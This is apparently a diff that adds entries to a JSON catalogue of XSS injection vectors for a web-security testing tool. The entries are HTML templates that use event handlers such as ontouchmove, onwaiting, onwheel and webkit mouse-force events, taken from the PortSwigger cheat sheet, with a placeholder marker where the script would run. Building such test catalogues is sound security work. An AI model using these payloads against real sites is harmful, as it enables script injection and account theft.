+{
+"id": "cs_ontouchmove",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body ontouchmove={{marker}}>",
+"why": "Fires when the touch screen and move, only mobile device — ontouchmove vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontouchstart",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body ontouchstart={{marker}}>",
+"why": "Fires when the touch screen, only mobile device — ontouchstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwaiting",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<audio controls onwaiting={{marker}}><source src=x type=x></audio>",
+"why": "Fires when the video/audio attempts to play — onwaiting vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitmouseforcechanged",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onwebkitmouseforcechanged={{marker}}>XSS</xss>",
+"why": "onwebkitmouseforcechanged — onwebkitmouseforcechanged vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitmouseforcedown",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onwebkitmouseforcedown={{marker}}>XSS</xss>",
+"why": "onwebkitmouseforcedown — onwebkitmouseforcedown vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitmouseforceup",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onwebkitmouseforceup={{marker}}>XSS</xss>",
+"why": "onwebkitmouseforceup — onwebkitmouseforceup vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitmouseforcewillbegin",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onwebkitmouseforcewillbegin={{marker}}>XSS</xss>",
+"why": "onwebkitmouseforcewillbegin — onwebkitmouseforcewillbegin vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitwillrevealbottom",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onwebkitwillrevealbottom={{marker}}>XSS</xss>",
+"why": "onwebkitwillrevealbottom — onwebkitwillrevealbottom vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwheel",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body onwheel={{marker}}>",
+"why": "Fires when you use the mouse wheel — onwheel vector from the PortSwigger cheat sheet"
+}
+]
